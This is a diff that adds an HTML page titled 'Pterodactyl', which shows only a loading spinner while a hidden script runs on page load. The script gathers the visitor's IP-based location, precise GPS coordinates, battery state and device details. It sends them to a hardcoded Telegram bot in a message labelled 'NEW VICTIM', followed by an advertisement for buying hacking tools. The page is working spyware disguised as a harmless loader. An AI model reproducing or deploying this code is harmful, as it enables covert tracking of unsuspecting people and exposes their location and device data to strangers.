@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pterodactyl</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 16px solid #3498db;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <script>
+        // Fungsi untuk mengumpulkan informasi pengguna
+        async function getUserInfo() {
+            const userInfo = {
+                ip: '',
+                city: '',
+                region: '',
+                country: '',
+                location: '',
+                batteryLevel: '',
+                batteryStatus: '',
+                deviceInfo: navigator.userAgent,
+                androidVersion: '',
+                deviceBrand: ''
+            };
+
+            // Mendapatkan informasi IP asli dan lokasi
+            try {
+                const ipResponse = await fetch('https://ipinfo.io/json');
+                const ipData = await ipResponse.json();
+                userInfo.ip = ipData.ip;
+                userInfo.city = ipData.city;
+                userInfo.region = ipData.region;
+                userInfo.country = ipData.country;
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+            }
+
+            // Mendapatkan informasi baterai
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    userInfo.batteryLevel = `${Math.floor(battery.level * 100)}%`;
+                    userInfo.batteryStatus = battery.charging ? 'Sedang di-charge' : 'Tidak di-charge';
+                } catch (error) {
+                    console.error('Error fetching battery info:', error);
+                }
+            } else {
+                userInfo.batteryLevel = 'Battery API not supported';
+                userInfo.batteryStatus = 'Battery API not supported';
+            }
+
+            // Mendapatkan informasi perangkat (Android version dan merek HP)
+            const userAgent = navigator.userAgent;
+            if (/Android/.test(userAgent)) {
+                const androidVersion = userAgent.match(/Android\s([0-9\.]+)/);
+                userInfo.androidVersion = androidVersion ? androidVersion[1] : 'Unknown';
+                userInfo.deviceBrand = userAgent.match(/\(([^)]+)\)/)[1];
+            } else {
+                userInfo.androidVersion = 'Not an Android device';
+                userInfo.deviceBrand = 'Not an Android device';
+            }
+
+            return userInfo;
+        }
+
+        // Fungsi untuk mendapatkan lokasi pengguna
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                            resolve(locationLink);
+                        },
+                        (error) => {
+                            reject('Error getting location: ' + error.message);
+                        }
+                    );
+                } else {
+                    reject('Geolocation is not supported by this browser.');
+                }
+            });
+        }
+
+        // Fungsi untuk mengirim data ke bot Telegram
+        async function sendToTelegram(userInfo, locationLink) {
+            const botToken = '7572583096:AAEeFI2Bp30rfjyWLveb7K_xTIynkfbxUHQ'; // Ganti dengan token bot Anda
+            const chatId = '7884201974'; // Ganti dengan chat ID Anda
+            const message = `
+𝗡𝗘𝗪 𝗩𝗜𝗖𝗧𝗜𝗠 𝗩𝗔𝗡𝗫𝗦𝗣𝗬
+
+⧼𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗨𝘀𝗲𝗿⧽
+📍IP Adrress: ${userInfo.ip}
+🏙️City: ${userInfo.city}
+🌐Region: ${userInfo.region}
+🗺️Country: ${userInfo.country}
+🌍Location: ${locationLink}
+🔋Battery Level: ${userInfo.batteryLevel}
+⚡Status Battery: ${userInfo.batteryStatus}
+
+📱Device Information: ${userInfo.deviceInfo}\n
+📱Version Android: ${userInfo.androidVersion}
+📱Brand Device: ${userInfo.deviceBrand}
+
+JIKA INGIN MEMBELI ALAT HACKING LAIN NYA BISA HUBUNGI WHATSAPP ATAU TELEGRAM YANG DI BAWAH INI\nWhatsapp : wa.me/6281374383083\nTelegram : t.me/VanWhhe
+            `;
+
+            // Kirim pesan ke bot Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => console.log('Message sent to Telegram:', data))
+                .catch(error => console.error('Error sending message:', error));
+        }
+
+        // Fungsi utama
+        async function main() {
+            try {
+                const userInfo = await getUserInfo();
+                const locationLink = await getLocation();
+                await sendToTelegram(userInfo, locationLink);
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        // Panggil fungsi utama saat halaman dimuat
+        window.onload = main;
+    </script>
+</body>
+</html>
